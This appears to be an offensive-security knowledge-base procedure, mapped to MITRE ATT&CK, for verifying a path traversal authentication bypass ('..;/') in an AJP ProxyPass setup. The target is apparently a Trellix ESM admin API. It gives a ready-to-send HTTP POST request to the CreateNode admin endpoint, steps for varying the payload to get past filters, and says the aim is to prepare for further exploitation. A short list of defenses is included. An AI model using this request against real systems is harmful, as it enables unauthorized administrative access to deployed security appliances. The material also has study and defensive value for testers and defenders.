---
id: proc-trellix-pt-verify-2
tags:
  - path-traversal
  - bypass
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:27.019Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Verify-Path-Traversal-Bypass-in-AJP

## Summary

This procedure validates the path traversal exploit by replaying requests to confirm consistent unauthorized access to the Snowservice API, demonstrating the AJP ProxyPass vulnerability to normalization bypass techniques.

## Description

The '..;/' sequence exploits insecure ProxyPass config, allowing access to /Snowservice/SnowflexAdminServices without auth, as per Black Hat 2018 path normalization insights. This step ensures the bypass is reliable before proceeding to injection.

## Requirements

1. Successful completion of prior traversal confirmation
2. [[tools/Burp-Suite]] configured as proxy
3. Target ESM instance responsive

## Defense

Defensive measures and detection strategies:

- Use mod_security rules to block traversal patterns
- Log and alert on AJP proxy requests to internal paths
- Regularly audit ProxyPass configurations for restrictions

## Objectives

1. Validate traversal reliability
2. Confirm no intermittent auth enforcement
3. Prepare for exploitation escalation

## Instructions

### Step 1: Replay Traversal Request

**Context**: Replay the Step 1 request from the attack chain to the same endpoint.

**Command** (HTTP POST via Burp):

```http
POST /rs/..;/Snowservice/SnowflexAdminServices/CreateNode HTTP/1.1
Host: target-esm.com
Content-Type: application/json

{"serverName":"test132","ip":"127.0.0.1","port":"1212","peerPort":"1210"}
```

> Expected output: Consistent HTTP 200 responses, proving bypass persistence.

### Step 2: Test Variations

**Context**: Slightly vary the payload to ensure robustness against basic filters.

**Command** (Modified replay):

Change serverName to "test133" and replay.

> Verify no failures, indicating effective bypass.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Burp-Suite]]

## Tags

- path-traversal
- ajp
